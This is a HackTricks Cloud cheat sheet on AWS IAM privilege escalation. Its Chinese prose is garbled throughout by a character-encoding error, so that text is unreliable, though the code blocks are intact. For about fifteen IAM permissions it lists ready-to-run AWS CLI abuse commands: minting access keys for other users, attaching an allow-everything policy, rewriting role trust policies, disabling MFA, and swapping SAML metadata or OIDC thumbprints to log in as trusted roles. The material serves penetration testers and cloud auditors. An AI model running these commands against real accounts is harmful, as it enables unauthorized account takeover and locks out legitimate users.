# AWS - IAMæƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## IAM

æœ‰å…³IAMçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æˆäºˆåˆ›å»ºæ–°IAMç­–ç•¥ç‰ˆæœ¬çš„æƒé™ï¼Œé€šè¿‡ä½¿ç”¨`--set-as-default`æ ‡å¿—ç»•è¿‡`iam:SetDefaultPolicyVersion`æƒé™çš„éœ€æ±‚ã€‚è¿™ä½¿å¾—å¯ä»¥å®šä¹‰è‡ªå®šä¹‰æƒé™ã€‚

**åˆ©ç”¨å‘½ä»¤ï¼š**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±å“ï¼š** é€šè¿‡å…è®¸åœ¨ä»»ä½•èµ„æºä¸Šæ‰§è¡Œä»»ä½•æ“ä½œï¼Œç›´æ¥å‡çº§æƒé™ã€‚

### **`iam:SetDefaultPolicyVersion`**

å…è®¸å°†IAMç­–ç•¥çš„é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºå¦ä¸€ä¸ªç°æœ‰ç‰ˆæœ¬ï¼Œå¦‚æœæ–°ç‰ˆæœ¬å…·æœ‰æ›´å¤šæƒé™ï¼Œåˆ™å¯èƒ½å‡çº§æƒé™ã€‚

**Bashå‘½ä»¤ï¼š**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±å“:** é€šè¿‡å¯ç”¨æ›´å¤šæƒé™è€Œè¿›è¡Œé—´æ¥ç‰¹æƒå‡çº§ã€‚

### **`iam:CreateAccessKey`**

å…è®¸ä¸ºå¦ä¸€ä¸ªç”¨æˆ·åˆ›å»ºè®¿é—®å¯†é’¥ ID å’Œç§˜å¯†è®¿é—®å¯†é’¥ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„ç‰¹æƒå‡çº§ã€‚

**åˆ©ç”¨:**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±å“:** é€šè¿‡å‡è®¾å¦ä¸€ä¸ªç”¨æˆ·çš„æ‰©å±•æƒé™æ¥ç›´æ¥æå‡ç‰¹æƒã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

å…è®¸åˆ›å»ºæˆ–æ›´æ–°ç™»å½•é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸ºAWSæ§åˆ¶å°ç™»å½•è®¾ç½®å¯†ç ï¼Œä»è€Œå¯¼è‡´ç›´æ¥ç‰¹æƒå‡çº§ã€‚

**åˆ©ç”¨åˆ›å»º:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å‡çº§çš„åˆ©ç”¨ï¼š**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±å“:** é€šè¿‡ä»¥"ä»»ä½•"ç”¨æˆ·èº«ä»½ç™»å½•ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UpdateAccessKey`**

å…è®¸å¯ç”¨å·²ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼Œå¦‚æœæ”»å‡»è€…æ‹¥æœ‰å·²ç¦ç”¨çš„å¯†é’¥ï¼Œåˆ™å¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚

**åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

### **å½±å“ï¼š** é€šè¿‡é‡æ–°æ¿€æ´»è®¿é—®å¯†é’¥è¿›è¡Œç›´æ¥æƒé™æå‡ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

å…è®¸ä¸ºç‰¹å®šçš„AWSæœåŠ¡ï¼ˆä¾‹å¦‚ï¼ŒCodeCommitï¼ŒAmazon Keyspacesï¼‰ç”Ÿæˆæˆ–é‡ç½®å‡­æ®ï¼Œç»§æ‰¿å…³è”ç”¨æˆ·çš„æƒé™ã€‚

**åˆ›å»ºåˆ©ç”¨ï¼š**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**ææƒæ¼æ´åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±å“ï¼š** ç›´æ¥æå‡ç”¨æˆ·æœåŠ¡æƒé™ã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ åˆ°ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡ç»§æ‰¿é™„åŠ ç­–ç•¥çš„æƒé™ç›´æ¥æå‡ç‰¹æƒã€‚

**ç”¨æˆ·çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**é’ˆå¯¹ç»„çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±å“:** ç›´æ¥æå‡åˆ°ç­–ç•¥æˆäºˆçš„ä»»ä½•æƒé™ã€‚

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

å…è®¸é™„åŠ æˆ–æ”¾ç½®ç­–ç•¥åˆ°è§’è‰²ã€ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡æˆäºˆé¢å¤–æƒé™å®ç°ç›´æ¥æƒé™æå‡ã€‚

**è§’è‰²çš„åˆ©ç”¨:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**åˆ©ç”¨å†…è”ç­–ç•¥ï¼š**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±å“:** é€šè¿‡ç­–ç•¥æ·»åŠ æƒé™è¿›è¡Œç›´æ¥æƒé™å‡çº§ã€‚

### **`iam:AddUserToGroup`**

å…è®¸å°†è‡ªå·±æ·»åŠ åˆ° IAM ç»„ä¸­ï¼Œé€šè¿‡ç»§æ‰¿ç»„çš„æƒé™æ¥å‡çº§ç‰¹æƒã€‚

**åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

### **å½±å“ï¼š** ç›´æ¥æå‡æƒé™è‡³ç»„æƒé™çº§åˆ«ã€‚

### **`iam:UpdateAssumeRolePolicy`**

å…è®¸ä¿®æ”¹è§’è‰²çš„å‡å®šè§’è‰²ç­–ç•¥æ–‡æ¡£ï¼Œä»è€Œå¯ç”¨å¯¹è¯¥è§’è‰²åŠå…¶å…³è”æƒé™çš„å‡å®šã€‚

**åˆ©ç”¨ï¼š**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
å½“ç­–ç•¥å¦‚ä¸‹æ‰€ç¤ºæ—¶ï¼Œè¯¥ç­–ç•¥å…è®¸ç”¨æˆ·è·å–å‡å®šè§’è‰²çš„æƒé™ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±å“:** é€šè¿‡å‡å®šä»»ä½•è§’è‰²çš„æƒé™ç›´æ¥æå‡ç‰¹æƒã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

å…è®¸ä¸Šä¼ ç”¨äºèº«ä»½éªŒè¯åˆ° CodeCommit çš„ SSH å…¬é’¥å’Œåœç”¨ MFA è®¾å¤‡ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„é—´æ¥ç‰¹æƒæå‡ã€‚

**é’ˆå¯¹ SSH å¯†é’¥ä¸Šä¼ çš„åˆ©ç”¨:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**ç»•è¿‡MFAåœç”¨çš„åˆ©ç”¨æ–¹æ³•ï¼š**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±å“:** é€šè¿‡å¯ç”¨CodeCommitè®¿é—®æˆ–ç¦ç”¨MFAä¿æŠ¤æ¥å®ç°é—´æ¥ç‰¹æƒå‡çº§ã€‚

### **`iam:ResyncMFADevice`**

å…è®¸é‡æ–°åŒæ­¥MFAè®¾å¤‡ï¼Œå¯èƒ½é€šè¿‡æ“çºµMFAä¿æŠ¤æ¥å®ç°é—´æ¥ç‰¹æƒå‡çº§ã€‚

**Bashå‘½ä»¤:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±å“ï¼š** é€šè¿‡æ·»åŠ æˆ–æ“çºµ MFA è®¾å¤‡è¿›è¡Œé—´æ¥ç‰¹æƒå‡çº§ã€‚

### `iam:UpdateSAMLProvider`ï¼Œ`iam:ListSAMLProviders`ï¼Œ(`iam:GetSAMLProvider`)

æ‹¥æœ‰è¿™äº›æƒé™åï¼Œæ‚¨å¯ä»¥**æ›´æ”¹ SAML è¿æ¥çš„ XML å…ƒæ•°æ®**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥æ»¥ç”¨**SAML è”åˆ**ä»¥ä½¿ç”¨ä¿¡ä»»å®ƒçš„**ä»»ä½•è§’è‰²**è¿›è¡Œ**ç™»å½•**ã€‚

è¯·æ³¨æ„ï¼Œè¿™æ ·åšä¼šå¯¼è‡´**åˆæ³•ç”¨æˆ·æ— æ³•ç™»å½•**ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥è·å– XMLï¼Œç„¶åæ›¿æ¢ä¸ºæ‚¨è‡ªå·±çš„ï¼Œç™»å½•å¹¶å°†å…ˆå‰çš„é…ç½®å›å¤ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
å¾…åŠäº‹é¡¹ï¼šä¸€ç§èƒ½å¤Ÿç”ŸæˆSAMLå…ƒæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`ï¼Œ`iam:ListOpenIDConnectProviders`ï¼Œ(`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº›**æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„**Thumbprint**ä»¥æˆåŠŸç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›ç¨‹åºçš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
